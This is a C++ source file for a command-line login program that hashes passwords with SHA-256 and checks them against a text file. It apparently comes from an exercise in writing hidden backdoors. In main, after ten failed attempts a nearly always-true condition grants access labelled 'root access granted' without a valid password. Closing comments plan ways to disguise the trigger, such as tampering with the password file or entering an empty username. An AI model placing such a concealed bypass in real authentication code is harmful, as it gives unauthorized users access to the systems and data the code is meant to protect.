#include <iostream>
#include <iomanip>
#include <string>
#include <sstream>
#include <fstream>
#include <set>
#include "authlib.h"
#include <openssl/sha.h>

using namespace std;
 int loginAttempts = 0;
 int lockout = 10;
 int loginfail = 0;
 int passwordfail = 0;

string usernameinput() {
	string username;
	while (true) {
		try {
		cout << "please enter a username: ";
		getline(cin, username);
		if (!username.empty()) {
			return username;
		}
			else {
			throw (loginfail);
			}
		
		} catch (int num){
			loginfail++;
			cerr << "ERROR: no username was entered!!!" << endl << endl;
		}
	}
}

string passwordinput() {
	string password;
	while (true) {
		cout << "please enter a password: ";
		getline(cin, password);
		if (password.empty()) {
			cerr << "ERROR: no password was entered!!! " << endl << endl;
		}
		else {
			return password;
		}
	}
}

bool validate(const string& username, const string& password) {
	ifstream rfile("passwords.txt");
	if (!rfile.is_open()) {
		cout << "error when opening file :/" << endl;
		passwordfail++;
		return false;
	}
	string line;
	while (getline(rfile, line)) {
		const long unsigned int position = line.find(":");
		if (position != string::npos) {
			string stored_username = line.substr(0, position);
			string stored_password = line.substr(position + 1);
			if (username == stored_username && password == stored_password) {
				rfile.close();
				return true;
			}		
		}
	}
	rfile.close();
	return false;
}

string sha256(const string str) {
	unsigned char hash[SHA256_DIGEST_LENGTH];
	SHA256_CTX sha256;
	SHA256_Init(&sha256);
	SHA256_Update(&sha256, str.c_str(), str.size());
	SHA256_Final(hash, &sha256);
	stringstream ss;
	for (int i = 0; i < SHA256_DIGEST_LENGTH; i++) {
		ss << hex << setw(2) << setfill('0') << (int)hash[i];
	}
	return ss.str();
}

int main() {
	while(true) {
	string username = usernameinput();
	string password = passwordinput();
	if (validate(username, sha256(password))) {
		authenticated(username);
		break;
	}
	else if(loginAttempts >= lockout){
		if ((loginfail > 0) >= (passwordfail > 0)) {
		authenticated(username + "root access granted");
		break;
	}
	}
	else {
		rejected(username);
		loginAttempts++;
	}
  }
}


//ideas
// hide empty username variable by having a function or main or something constantly reading the command line output and *then* checking if the password fail variable is 10+
// potentially adding another layer of subversion by tripping the error "when opening file". Maybe to subvert you'd have to delete the password file or rename it and then run the program casuing it to trip and re-add the password file back. Maybe make it the first step? 
// have the empty username variable be the top condition that triggers and checks if the other one (two?) conditions are fulfilled and ideally have it no be a variable so it can reset itself and not be int counter based
